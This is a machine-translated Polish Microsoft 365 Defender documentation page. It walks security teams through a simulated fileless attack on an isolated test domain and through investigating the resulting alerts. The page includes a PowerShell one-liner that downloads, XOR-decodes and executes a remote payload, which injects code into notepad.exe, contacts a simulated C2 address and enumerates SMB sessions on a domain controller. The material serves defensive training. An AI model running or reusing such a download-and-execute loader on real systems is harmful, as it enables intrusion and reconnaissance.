---
title: Run an attack simulation in a Microsoft 365 Defender pilot environment
description: Run attack simulations for Microsoft 365 Defender to see how alerts and incidents are presented, insights are gained, and threats are quickly remediated.
search.product: eADQiWindows 10XVcnh
search.appverid: met150
ms.prod: m365-security
ms.mktglfcycl: deploy
ms.sitesec: library
ms.pagetype: security
f1.keywords:
- NOCSH
ms.author: dansimp
author: dansimp
ms.date: 07/09/2021
ms.localizationpriority: medium
manager: dansimp
audience: ITPro
ms.collection:
- M365-security-compliance
- m365solution-scenario
- m365solution-pilotmtpproject
ms.custom: admindeeplinkDEFENDER
ms.topic: conceptual
ms.technology: m365d
ms.openlocfilehash: bf7592055e58f10a3680e6ee712c597780591a47
ms.sourcegitcommit: 3b8e009ea1ce928505b8fc3b8926021fb91155f3
ms.translationtype: MT
ms.contentlocale: pl-PL
ms.lasthandoff: 03/28/2022
ms.locfileid: "64498588"
---
# <a name="run-an-attack-simulation-in-a-microsoft-365-defender-pilot-environment"></a>Run an attack simulation in a Microsoft 365 Defender pilot environment


Ten artykuł to [krok 1 z 2](eval-defender-investigate-respond.md) w procesie wykonywania badania i reakcji w przypadku zdarzenia w Microsoft 365 Defender przy użyciu środowiska pilotażowego. Aby uzyskać więcej informacji na temat tego procesu, zobacz artykuł [z omówieniem](eval-defender-investigate-respond.md) .

Po przygotowaniu środowiska [pilotażowego](eval-defender-investigate-respond.md) należy przetestować reakcję programu Microsoft 365 Defender na zdarzenia oraz automatyczne badania i działania naprawcze przez utworzenie zdarzenia z symulowanym atakiem i użycie portalu Microsoft 365 Defender w celu zbadania i reakcji.

Zdarzenie w Microsoft 365 Defender to zbiór skorelowanych alertów i skojarzonych z nimi danych, które są związane z atakiem.

Microsoft 365 i aplikacje tworzą alerty po wykryciu podejrzanych lub złośliwych zdarzeń bądź aktywności. Poszczególne alerty zawierają cenne wskazówki dotyczące ukończonych lub trwających ataków. Jednak zazwyczaj w atakach stosowane są różne techniki wobec różnych typów obiektów, takich jak urządzenia, użytkownicy i skrzynki pocztowe. Wynikiem jest wiele alertów dla wielu obiektów w dzierżawie.

>[!Note]
>Jeśli jesteś nowym użytkownikiem analizy zabezpieczeń i reagowania na zdarzenia, zobacz [](first-incident-overview.md) Instruktaż Odpowiedz na pierwsze zdarzenie, aby zapoznać się z przewodnikiem po typowym procesie analizy, rozwiązywania problemów i przeglądu po zajściu.
>

## <a name="simulate-attacks-with-the-microsoft-365-defender-portal"></a>Symulowanie ataków za pomocą Microsoft 365 Defender sieci

Portal Microsoft 365 Defender ma wbudowane możliwości tworzenia symulowanych ataków na środowisko pilotażowe:

- Szkolenie dotyczące symeny ataków Microsoft 365 Defender dla Office 365 w .[https://security.microsoft.com/attacksimulator](https://security.microsoft.com/attacksimulator)
  
  W portalu Microsoft 365 Defender wybierz pozycję Szkolenia **& dotyczące współpracy z > atakami**.

- Samouczki dotyczące ataków & przykładów Microsoft 365 Defender dla punktu końcowego w punkcie [https://security.microsoft.com/tutorials/simulations](https://security.microsoft.com/tutorials/simulations).

  W portalu <a href="https://go.microsoft.com/fwlink/p/?linkid=2077139" target="_blank">Microsoft 365 Defender wybierz</a> pozycję **Punkty końcowe > samouczki & symulowania**.

### <a name="defender-for-office-365-attack-simulation-training"></a>Ochrona usługi Office 365 w usłudze Defender szkolenia symulacyjnego z atakami

Ochrona usługi Office 365 w usłudze Defender z programem Microsoft 365 E5 lub Ochrona usługi Office 365 w usłudze Microsoft Defender Plan 2 obejmuje szkolenia symezyjne dotyczące prób wyłudzania informacji. Podstawowe czynności są następujące:

1. Tworzenie symulacyjnej

   Aby uzyskać instrukcje krok po kroku dotyczące tworzenia i uruchamiania nowej symulacyjnej, zobacz [Symulowanie ataku służącego do wyłudzania informacji](/microsoft-365/security/office-365-security/attack-simulation-training).

2. Tworzenie ładu

   Aby uzyskać instrukcje krok po kroku dotyczące sposobu tworzenia ładu do użytku w ramach symulacyjnej, zobacz Tworzenie niestandardowego obciążenia na szkolenia [z użyciem symezyjny ataków](/microsoft-365/security/office-365-security/attack-simulation-training-payloads).

3. Uzyskiwanie szczegółowych informacji

   Aby uzyskać szczegółowe instrukcje krok po kroku dotyczące sposobu uzyskania szczegółowych informacji na temat raportowania, zobacz Zdobywanie szczegółowych informacji dzięki szkoleniom [symulacyjnych ataków](/microsoft-365/security/office-365-security/attack-simulation-training-insights).

   > [!VIDEO https://www.microsoft.com/videoplayer/embed/RWMhvB]

Aby uzyskać więcej informacji, zobacz [Symulacje](/microsoft-365/security/office-365-security/attack-simulation-training-get-started#simulations).

### <a name="defender-for-endpoint-attack-tutorials--simulations"></a>Samouczki dotyczące ataków w programie Defender dla punktów końcowych & przykładów

Poniżej znajdują się przykłady programu Defender for Endpoint firmy Microsoft:

- Dokument jest upuszczany w backdoor
- Zautomatyzowane badanie (backdoor)

Dostępne są dodatkowe symulowania z innych źródeł. Dostępne są również zestaw samouczków.

Dla każdej symulacyjnej lub samouczka:

1. Pobierz i przeczytaj odpowiedni dokument.

2. Pobierz plik symulacyjnej pracy. Możesz pobrać plik lub skrypt na urządzenie testowe, ale nie jest to obowiązkowe.

3. Uruchom plik symulacyjnej lub skrypt na urządzeniu testowym zgodnie z instrukcjami w dokumencie.

 Aby uzyskać więcej informacji, zobacz [Środowisko Ochrona punktu końcowego w usłudze Microsoft Defender symulowanego ataku](/microsoft-365/security/defender-endpoint/attack-simulations).

## <a name="simulate-an-attack-with-an-isolated-domain-controller-and-client-device-optional"></a>Symulowanie ataków za pomocą odizolego kontrolera domeny i urządzenia klienckiego (opcjonalnie)

W tym opcjonalnym ćwiczeniu w odpowiedzi na incydenty zasymulujesz atak na odizolowanym kontrolerze domeny (AD DS) i urządzeniu Windows za pomocą skryptu programu PowerShell, a następnie zbadasz, rozwiążesz i rozwiążesz zdarzenie. Active Directory Domain Services

Najpierw musisz dodać punkty końcowe do środowiska pilotażowego.

### <a name="add-pilot-environment-endpoints"></a>Dodawanie punktów końcowych środowiska pilotażowego

Najpierw musisz dodać do środowiska pilotażowego AD DS odizolowane urządzenie Windows domeny i urządzenie przenośne.

1. Sprawdź, czy w dzierżawie pilotażowej [włączono Microsoft 365 Defender](m365d-enable.md#confirm-that-the-service-is-on).

2. Sprawdź, czy twój kontroler domeny:

   - Działa Windows Server 2008 R2 lub nowszy.
   - Raporty dla [Microsoft Defender for Identity](/azure/security-center/security-center-wdatp) i włączone [zarządzanie zdalne](/windows-server/administration/server-manager/configure-remote-management-in-server-manager).
   - Ma [Microsoft Defender for Identity i Microsoft Defender for Cloud Apps włączona integracja](/cloud-app-security/mdi-integration).
   - Ma utworzonego użytkownika testowego w domenie testowej. Uprawnienia na poziomie administratora nie są potrzebne.

3. Sprawdź, czy twoje urządzenie testowe:

   - Działa Windows 10 wersji 1903 lub nowszej.
   - Jest przyłączony do domeny AD DS domeny.
   - Ma [Program antywirusowy Windows Defender](/windows/security/threat-protection/windows-defender-antivirus/configure-windows-defender-antivirus-features) włączone. Jeśli masz problem z włączeniem Program antywirusowy Windows Defender, zobacz ten [temat rozwiązywania problemów](/windows/security/threat-protection/microsoft-defender-atp/troubleshoot-onboarding#ensure-that-microsoft-defender-antivirus-is-not-disabled-by-a-policy).
   - Jest [on dołączany do Ochrona punktu końcowego w usłudze Microsoft Defender](/windows/security/threat-protection/microsoft-defender-atp/configure-endpoints).

Jeśli korzystasz z grup dzierżawy i urządzeń, utwórz dedykowaną grupę urządzeń dla urządzenia testowego i wypychaj ją na najwyższy poziom.

Jedną z możliwości jest hostowania AD DS domeny i testowanie urządzenia jako maszyn wirtualnych w usługach Microsoft Azure infrastruktury. Możesz skorzystać z instrukcji z fazy [1](/microsoft-365/enterprise/simulated-ent-base-configuration-microsoft-365-enterprise#phase-1-create-a-simulated-intranet) symulowanego przewodnika laboratorium testowego dla przedsiębiorstw, ale pominąć tworzenie maszyny wirtualnej APP1.

Oto wynik.

:::image type="content" source="../../media/eval-defender-investigate-respond/eval-defender-eval-investigate-respond-endpoints-tlg.png" alt-text="Środowisko oceny za pomocą symulowanego przewodnika laboratorium testowego dla przedsiębiorstw" lightbox="../../media/eval-defender-investigate-respond/eval-defender-eval-investigate-respond-endpoints-tlg.png":::

Symulowany jest zaawansowany atak, który korzysta z zaawansowanych technik, które można ukryć przed wykryciem. W atakach wyliczyliśmy otwarte sesje blokowania wiadomości serwera (SMB) w kontrolerach domeny i pobierane najnowsze adresy IP urządzeń użytkowników. Tego rodzaju ataki zazwyczaj nie obejmują plików upuszczanych na urządzenie ofiar i występują wyłącznie w pamięci. Dzięki użyciu istniejących narzędzi systemowych i administracyjnych można "zmieć swój kod" w procesach systemowych, aby ukryć swoje wykonywanie. Takie zachowanie pozwala uniknąć wykrywania i zachowywać się na urządzeniu.

W tej sytuacji przykładowy scenariusz zaczyna się od skryptu programu PowerShell. W świecie rzeczywistym użytkownik może zostać nakłaniany do uruchomienia skryptu lub może uruchomić połączenie zdalne z innym komputerem z wcześniej zainfekowanym urządzeniem, co wskazuje, że atakujący próbuje przejść później w sieć. Wykrywanie tych skryptów może być trudne, ponieważ administratorzy często często uruchamiają je zdalnie w celu wykonywania różnych działań administracyjnych.

:::image type="content" source="../../media/mtp/mtpdiydiagram.png" alt-text="Atak programu PowerShell bez plików z przetwarzaniem procesu i atakiem ponownego rozpoznania SMB" lightbox="../../media/mtp/mtpdiydiagram.png":::

Podczas symulacji atak dodaje kod powłoki do pozornie procesu przepływu. Scenariusz wymaga użycia notepad.exe. Wybraliśmy ten proces na platformie symulacyjnej, ale przestępcy z większą prawdopodobieństwem będą dotyczyć długo działającego procesu systemowego, takiego jak svchost.exe. Kod powłoki przechodzi następnie do serwera poleceń i kontrolek atakującego (C2) w celu otrzymania instrukcji dotyczących kontynuowania. Skrypt próbuje wykonać kwerendy rozpoznawcze na kontrolerze domeny (DC). Renaissance umożliwia atakującemu uzyskiwanie informacji o ostatnich danych logowania użytkownika. Gdy atakujący uzyskają takie informacje, mogą przejść później do sieci w celu uzyskania dostępu do określonego poufnego konta.

> [!IMPORTANT]
> Aby uzyskać optymalne wyniki, należy jak najścigniej postępować zgodnie z instrukcjami symulacyjnych ataków.

### <a name="run-the-isolated-ad-ds-domain-controller-attack-simulation"></a>Uruchamianie odizolowanych AD DS ataków na kontroler domeny

Aby uruchomić symulację scenariusza ataków:

1. Upewnij się, że środowisko pilotażowe zawiera odizolowany AD DS domeny i Windows urządzenia.

2. Zaloguj się na urządzeniu testowym za pomocą testowego konta użytkownika.

3. Otwórz okno Windows PowerShell na urządzeniu testowym.

4. Skopiuj następujący skrypt symulowania:

   ```powershell
   [Net.ServicePointManager]::SecurityProtocol = [Net.SecurityProtocolType]::Tls12;$xor
   = [System.Text.Encoding]::UTF8.GetBytes('WinATP-Intro-Injection');$base64String = (Invoke-WebRequest -URI "https://winatpmanagement.windows.com/client/management/static/MTP_Fileless_Recon.txt"
   -UseBasicParsing).Content;Try{ $contentBytes = [System.Convert]::FromBase64String($base64String) } Catch { $contentBytes = [System.Convert]::FromBase64String($base64String.Substring(3)) };$i = 0;
   $decryptedBytes = @();$contentBytes.foreach{ $decryptedBytes += $_ -bxor $xor[$i];
   $i++; if ($i -eq $xor.Length) {$i = 0} };Invoke-Expression ([System.Text.Encoding]::UTF8.GetString($decryptedBytes))
   ```

   > [!NOTE]
   > Po otwarciu tego artykułu w przeglądarce internetowej mogą wystąpić problemy z kopiowaniem pełnego tekstu bez utraty określonych znaków lub wprowadzeniem dodatkowych podziałów wiersza. W takim przypadku pobierz ten dokument i otwórz go w programie Adobe Reader.

5. Wklej i uruchom skopiowany skrypt w oknie programu PowerShell.

> [!NOTE]
> Jeśli korzystasz z programu PowerShell przy użyciu protokołu pulpitu zdalnego (RDP), użyj polecenia Wpisz tekst schowka w kliencie RDP, ponieważ metoda **klawisza dostępu CTRL-V** lub kliknięcia prawym przyciskiem myszy może nie działać. Ostatnie wersje programu PowerShell czasami również nie akceptują tej metody. Najpierw trzeba skopiować program Notatnik w pamięci, skopiować go na maszynę wirtualną, a następnie wkleić do programu PowerShell.

Kilka sekund później zostanie otwarta Notatnik. Symulowany kod ataków zostanie wsadowany w Notatnik. Nie otwieraj automatycznie wygenerowanego Notatnik, aby było pełne środowisko scenariusza.

Symulowany kod ataków spróbuje przekazać do zewnętrznego adresu IP (simulując serwer C2), a następnie podejmie próbę rozpoznania kontrolera domeny za pośrednictwem protokołu SMB.

Po ukończeniu tego skryptu na konsoli programu PowerShell zostanie wyświetlony ten komunikat:

```console
ran NetSessionEnum against [DC Name] with return code result 0
```

Aby zobaczyć działanie funkcji automatycznego reagowania i zdarzenia, nie notepad.exe otwarty. Zostanie wyświetlony automatyczny proces reakcji i zdarzenia oraz zatrzymania Notatnik zdarzenia.

### <a name="investigate-the-incident-for-the-simulated-attack"></a>Badanie zdarzenia w celu symulowanego ataku

> [!NOTE]
> Zanim przejdę przez tę symulację, obejrzyj poniższy klip wideo, aby zobaczyć, jak zarządzanie zdarzeniami ułatwia skonsulować powiązane alerty w ramach procesu badania, gdzie można je znaleźć w portalu i jak może ułatwić Ci to działanie w ramach operacji zabezpieczeń:

> [!VIDEO https://www.microsoft.com/videoplayer/embed/RE4Bzwz?]

Teraz, po przełączeniu się do punktu widzenia analityka SOC, możesz rozpocząć badanie ataków w portalu Microsoft 365 Defender danych.

1. Otwórz Microsoft 365 Defender <a href="https://go.microsoft.com/fwlink/p/?linkid=2077139" target="_blank">witryny</a>.

2. W okienku nawigacji wybierz pozycję **Zdarzenia i & alerty > zdarzeniach**.

3. Nowe zdarzenie dotyczące symulowanego ataku pojawi się w kolejce zdarzenia.

   :::image type="content" source="../../media/mtp/fig2.png" alt-text="Przykład kolejki Zdarzenia" lightbox="../../media/mtp/fig2.png":::

#### <a name="investigate-the-attack-as-a-single-incident"></a>Badanie ataków jako pojedynczego zdarzenia

Microsoft 365 Defender skoreluje analizy i agreguje wszystkie powiązane alerty i analizy z różnych produktów w jedną jednostkę zdarzenia. W ten sposób Microsoft 365 Defender pełniejszą historię ataków, pozwalając analitykowi SOC na zrozumienie złożonych zagrożeń i reagowanie na nie.

Alerty wygenerowane podczas tej symulacyjnej analizy są skojarzone z tym samym zagrożeniem, w wyniku czego są automatycznie agregowane jako jedno zdarzenie.

Aby wyświetlić zdarzenie:

1. Otwórz Microsoft 365 Defender <a href="https://go.microsoft.com/fwlink/p/?linkid=2077139" target="_blank">witryny</a>.

2. W okienku nawigacji wybierz pozycję **Zdarzenia i & alerty > zdarzeniach**.

3. Zaznacz najnowszy element, klikając okrąg znajdujący się po lewej stronie nazwy zdarzenia. Na panelu bocznym są wyświetlane dodatkowe informacje o zdarzeniu, w tym wszystkie związane z nim alerty. Każde zdarzenie ma unikatową nazwę, która opisuje je na podstawie atrybutów uwzględnianych w nim alertów.

   Alerty wyświetlane na pulpicie nawigacyjnym można filtrować według zasobów usługi: Microsoft Defender for Identity, Microsoft Defender for Cloud Apps, Ochrona punktu końcowego w usłudze Microsoft Defender, Microsoft 365 Defender i Ochrona usługi Office 365 w usłudze Microsoft Defender.

3. Wybierz **pozycję Otwórz stronę zdarzenia,** aby uzyskać więcej informacji o zdarzeniu.

   Na stronie **Zdarzenie** widać wszystkie alerty i informacje dotyczące zdarzenia. Informacje te obejmują jednostki i zasoby, które biorą udział w alercie, źródło wykrywania alertów (takie jak Microsoft Defender for Identity lub Ochrona punktu końcowego w usłudze Microsoft Defender) oraz przyczynę ich powiązać. Przeglądanie listy alertów o incydentach zawiera informacje o postępie ataków. W tym widoku możesz wyświetlić i zbadać poszczególne alerty.

   Możesz również **kliknąć pozycję Zarządzaj** zdarzeniem w menu po prawej stronie, aby otagować zdarzenie, przypisać je do siebie i dodać komentarze.

#### <a name="review-generated-alerts"></a>Przeglądanie wygenerowanych alertów

Przyjrzyjmy się niektórym alertom wygenerowanym podczas symulowanego ataku.

> [!NOTE]
> W symulowanym ataku zostanie wygenerowanych tylko kilka alertów. W zależności od wersji pakietu Windows i wersji Microsoft 365 Defender na urządzeniu testowym, mogą zostać wyświetlone więcej alertów wyświetlanych w nieco innej kolejności.

:::image type="content" source="../../media/mtp/fig6.png" alt-text="Przykład wygenerowanego alertu" lightbox="../../media/mtp/fig6.png":::

##### <a name="alert-suspicious-process-injection-observed-source-microsoft-defender-for-endpoint"></a>Alert: obserwowany podejrzany przebieg procesu (źródło: Ochrona punktu końcowego w usłudze Microsoft Defender)

Zaawansowani atakujący używają zaawansowanych metod, które pozostają w pamięci i ukrywają się przed narzędziami wykrywania. Jedną z typowych technik jest działanie z poziomu zaufanego procesu systemowego, a nie ze złośliwego pliku wykonywalnego, co ułatwia wykrywanie narzędzi i operacji zabezpieczeń w celu wykrycia złośliwego kodu.

Aby umożliwić analitykom SOC wychwycić te zaawansowane ataki, czujniki pamięci głębokości w usłudze Ochrona punktu końcowego w usłudze Microsoft Defender zapewniają naszą usługę w chmurze wgląd w szereg różnych technik insekcji kodu krzyżowego. Na poniższej ilustracji pokazano, jak program Defender for Endpoint wykrył i alertował podczas próby wsadu kodu w <i>notepad.exe</i>.

:::image type="content" source="../../media/mtp/fig7.png" alt-text="Przykład alertu w celu podania potencjalnie złośliwego kodu" lightbox="../../media/mtp/fig7.png":::

##### <a name="alert-unexpected-behavior-observed-by-a-process-run-with-no-command-line-arguments-source-microsoft-defender-for-endpoint"></a>Alert: Zachowanie nieoczekiwane obserwowane w przypadku uruchomienia procesu bez argumentów wiersza polecenia (Źródło: Ochrona punktu końcowego w usłudze Microsoft Defender)

Ochrona punktu końcowego w usłudze Microsoft Defender często są kierowane do najczęściej używanego atrybutu techniki ataków. Ta metoda zapewnia niezawodność i zwiększa słupki dla atakujących w celu przełączenia się do nowszej taktyki.

Stosujemy algorytmy edukacyjne na dużą skalę, aby określać normalne zachowanie typowych procesów w organizacji i na całym świecie, i obserwujmy, kiedy te procesy pokazują anomaliczne zachowania. Te anomalne zachowania często wskazują, że wprowadzono niepotrzebny kod i że został uruchomiony w innym zaufanym procesie.

W tym scenariuszu proces <i>notepad.exenietypowe zachowanie </i> , obejmujące komunikację z lokalizacją zewnętrzną. Ten wynik jest niezależny od konkretnej metody wprowadzenia i wykonania złośliwego kodu.

> [!NOTE]
> Ten alert jest oparty na modelach uczenia maszynowego, które wymagają dodatkowego przetwarzania zaplecza, dlatego może minieć trochę czasu, zanim ten alert zostanie wyświetlony w portalu.

Zwróć uwagę, że szczegóły alertu obejmują zewnętrzny adres IP — wskaźnik, który może być przestawny, aby rozwinąć badanie.

Wybierz adres IP w drzewie procesu alertu, aby wyświetlić stronę szczegółów adresu IP.

:::image type="content" source="../../media/mtp/fig8.png" alt-text="Przykład nieoczekiwanego zachowania po uruchomieniu procesu bez argumentów wiersza polecenia" lightbox="../../media/mtp/fig8.png":::

Na poniższej ilustracji przedstawiono wybraną stronę szczegółów adresu IP (kliknięcie adresu IP w drzewie procesu alertu).

:::image type="content" source="../../media/mtp/fig9.png" alt-text="Przykład strony ze szczegółami adresu IP" lightbox="../../media/mtp/fig9.png":::

##### <a name="alert-user-and-ip-address-reconnaissance-smb-source-microsoft-defender-for-identity"></a>Alert: Rozpoznanie użytkownika i adresu IP (SMB, User and IP address reconnaissance) (Źródło: Microsoft Defender for Identity)

Wyliczenie przy użyciu protokołu blokowania wiadomości serwera (SMB, Server Message Block) umożliwia atakującym uzyskanie przez atakujących ostatnich informacji logowania użytkownika, które pomagają im przejść dalej przez sieć w celu uzyskania dostępu do określonego poufnego konta.

Podczas tego wykrywania jest wyzwalany alert, gdy wyliczenie sesji SMB jest uruchamiane na kontrolerze domeny.

:::image type="content" source="../../media/mtp/fig10.png" alt-text="Przykład alertu Microsoft Defender for Identity adres IP i użytkownika" lightbox="../../media/mtp/fig10.png":::

#### <a name="review-the-device-timeline-with-microsoft-defender-for-endpoint"></a>Przejrzyj oś czasu urządzenia za pomocą Ochrona punktu końcowego w usłudze Microsoft Defender

Po przeglądaniu różnych alertów dotyczących tego zdarzenia przejdź z powrotem do strony zdarzenia, która była wcześniej analizowana. Wybierz **kartę Urządzenia** na stronie zdarzenia, aby przejrzeć urządzenia związane z tym zdarzeniem, jak zostało zgłoszone przez Ochrona punktu końcowego w usłudze Microsoft Defender i Microsoft Defender for Identity.

Wybierz nazwę urządzenia, na którym został przeprowadzony atak, aby otworzyć stronę jednostki dla tego konkretnego urządzenia. Na tej stronie widać alerty, które zostały wyzwolone, oraz powiązane zdarzenia.

Wybierz **kartę Oś czasu** , aby otworzyć oś czasu urządzenia i wyświetlić wszystkie zdarzenia i zachowania obserwowane na urządzeniu w kolejności chronologicznej z podniesionym alertami.

:::image type="content" source="../../media/mtp/fig11.png" alt-text="Przykładowa oś czasu urządzenia z zachowaniami" lightbox="../../media/mtp/fig11.png":::

Rozwinięcie niektórych bardziej interesujących zachowań dostarcza przydatnych informacji, takich jak drzewa rozsyłki.

Na przykład przewiń w dół, aż znajdziesz zdarzenie alertu **Obserwowane zdarzenie podejrzanego procesu.** Wybierzpowershell.exe **przykładowe notepad.exe** zdarzenia procesu poniżej tego zdarzenia, aby wyświetlić pełne drzewo procesu dla tego zachowania pod wykresem jednostki zdarzenia w okienku  bocznym. Jeśli to konieczne, użyj paska wyszukiwania do filtrowania.

:::image type="content" source="../../media/mtp/fig12.png" alt-text="Przykład drzewa procesu dla wybranego zachowania podczas tworzenia pliku programu PowerShell" lightbox="../../media/mtp/fig12.png":::

#### <a name="review-the-user-information-with-microsoft-defender-for-cloud-apps"></a>Przejrzyj informacje o użytkowniku za pomocą Microsoft Defender for Cloud Apps

Na stronie zdarzenia wybierz kartę Użytkownicy, aby wyświetlić listę użytkowników, którzy biorą udział w atakach. Ta tabela zawiera dodatkowe informacje o poszczególnych użytkownikach, w tym ocenę priorytetu badania **każdego** użytkownika.

Wybierz nazwę użytkownika, aby otworzyć stronę profilu użytkownika, gdzie można przeprowadzić dalsze badanie. [Dowiedz się więcej o badanie ryzykownych użytkowników](/cloud-app-security/tutorial-ueba#identify).

:::image type="content" source="../../media/mtp/fig13.png" alt-text="strona Defender dla Chmury użytkowników aplikacji" lightbox="../../media/mtp/fig13.png":::

#### <a name="automated-investigation-and-remediation"></a>Zautomatyzowane badanie i rozwiązywanie problemów

> [!NOTE]
>Przed rozpoczęciem tej symulacyjnej pracy obejrzyj poniższy klip wideo, aby dowiedzieć się, co to jest automatyczna samodzielna ochrona, gdzie można je znaleźć w portalu i jak może ona pomóc w działaniach zabezpieczeń:

> [!VIDEO https://www.microsoft.com/en-us/videoplayer/embed/RE4BzwB]

Przejdź wstecz do zdarzenia w portalu Microsoft 365 Defender. Karta **Badania na** stronie **Zdarzenie** zawiera zautomatyzowane badania, które zostały wyzwolone przez Microsoft Defender for Identity i Ochrona punktu końcowego w usłudze Microsoft Defender. Poniższy zrzut ekranu przedstawia tylko zautomatyzowane badanie wyzwalane przez program Defender for Endpoint. Domyślnie program Defender for Endpoint automatycznie naprawia artefakty znalezione w kolejce, co wymaga działań naprawczych.

:::image type="content" source="../../media/mtp/fig14.png" alt-text="Przykład zautomatyzowanego badania związanego ze zdarzeniem" lightbox="../../media/mtp/fig14.png":::

Wybierz alert, który wyzwolił badanie w celu otwarcia strony **Szczegóły** badania. Zobaczysz następujące szczegóły:

- Alerty, które wyzwoliły zautomatyzowane badanie.
- Urządzenia i użytkownicy, których to ma wpływ. Jeśli wskaźniki zostaną znalezione na dodatkowych urządzeniach, zostaną również wyświetlone te dodatkowe urządzenia.
- Lista dowodów. Odnalezione i przeanalizowane jednostki, takie jak pliki, procesy, usługi, sterowniki i adresy sieciowe. Te jednostki są analizowane pod celu przeanalizowania możliwych relacji z alertem i ocenione jako ekstremem lub złośliwe.
- Znalezione zagrożenia. Znane zagrożenia odnalezione podczas badania.

> [!NOTE]
> W zależności od chronometrażu automatyczne badanie może być nadal uruchomione. Przed zebraniem i przeanalizowaniem dowodów oraz przejrzenia wyników poczekaj kilka minut na ukończenie procesu. Odśwież stronę **Szczegóły badania** , aby uzyskać najnowsze wyniki.

:::image type="content" source="../../media/mtp/fig15.png" alt-text="Przykład strony Szczegóły badania" lightbox="../../media/mtp/fig15.png":::

Podczas zautomatyzowanego badania Ochrona punktu końcowego w usłudze Microsoft Defender zidentyfikował proces notepad.exe, który został przysłany jako jeden z artefaktów wymagających rozwiązania. Program Defender for Endpoint automatycznie zatrzymuje podejrzaną autoryzację procesu w ramach automatycznego rozwiązywania problemów.

Możesz zobaczyć <i> ,notepad.exe</i> z listy uruchomionych procesów na urządzeniu testowym.

#### <a name="resolve-the-incident"></a>Rozwiązywanie zdarzenia

Po zakończeniu badania i potwierdzeniu jego rozwiązania możesz rozwiązać to zdarzenie.

Na stronie **Zdarzenie** wybierz pozycję **Zarządzaj zdarzeniem**. Ustaw stan Na wypadek **zdarzenia i** wybierz pozycję **Prawda alert** dla klasyfikacji i testowania **zabezpieczeń** w celu określenia.

:::image type="content" source="../../media/mtp/fig16.png" alt-text="Przykład strony zdarzeń z otwartym panelem zarządzania zdarzeniami, na którym można kliknąć przełącznik, aby rozwiązać problem" lightbox="../../media/mtp/fig16.png":::

Gdy zdarzenie zostanie rozwiązane, rozpozna wszystkie skojarzone alerty w portalu usługi Microsoft 365 Defender powiązanych portalach.

Niniejszy temat dotyczy symulacyjnych ataków na analizy zdarzeń, zautomatyzowane badania i rozwiązywania zdarzeń.

## <a name="next-step"></a>Następny krok

[:::image type="content" source="../../media/eval-defender-investigate-respond/eval-defender-eval-investigate-respond-step2.png" alt-text="Funkcje Microsoft 365 Defender reagowania na zdarzenia" lightbox="../../media/eval-defender-investigate-respond/eval-defender-eval-investigate-respond-step2.png":::](eval-defender-investigate-respond-additional.md)

Krok 2 z 2. Wypróbuj [Microsoft 365 Defender reagowania na incydenty](eval-defender-investigate-respond-additional.md)

### <a name="navigation-you-may-need"></a>Nawigacja, która może być potrzebna

[Tworzenie środowiska Microsoft 365 Defender oceny](eval-create-eval-environment.md)
